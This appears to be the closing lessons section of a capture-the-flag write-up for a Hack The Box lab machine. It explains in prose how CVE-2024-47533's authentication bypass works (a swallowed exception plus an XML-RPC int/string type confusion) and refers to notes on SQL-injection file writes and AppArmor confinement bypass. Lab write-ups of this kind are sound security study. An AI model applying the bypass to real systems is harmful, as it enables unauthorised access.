- **A cracked hash's source matters less than whether it matches what was
  actually extracted from the live target.** Consulting a public writeup
  after independent effort genuinely stalled is a legitimate unblock — but
  the thing worth trusting is the byte-for-byte match between the
  live-extracted hash and the writeup's claimed hash, confirmed with one
  real login attempt, not the writeup's plaintext claim on its own.
- **CVE-2024-47533 is a clean case study in swallowed-exception auth logic**:
  an invalid `open()` call unconditionally throws, a bare `except Exception`
  turns that into a sentinel value, and a downstream equality check trusts
  the sentinel as if it were real data. The type-confusion detail (the
  password must arrive as an XML-RPC `<int>`, not a `<string>`) exists
  purely because Python's `==` never coerces between `int` and `str` —
  worth remembering as a general pattern any time a language's dynamic
  typing intersects with a wire format that preserves type information.
- **A "meet the team" or "under development" page's stated specialties can
  be a literal hint list, not flavor text** — every control encountered on
  this box (AppArmor hardening, chroot jailing) mapped directly to a named
  team member's stated expertise on `deploy.cobblestone.htb`.

New technique notes extracted for reuse:
[[sqli-file-write-web-servable-directory-targeting]],
[[apparmor-hat-exec-confinement-native-function-bypass]].
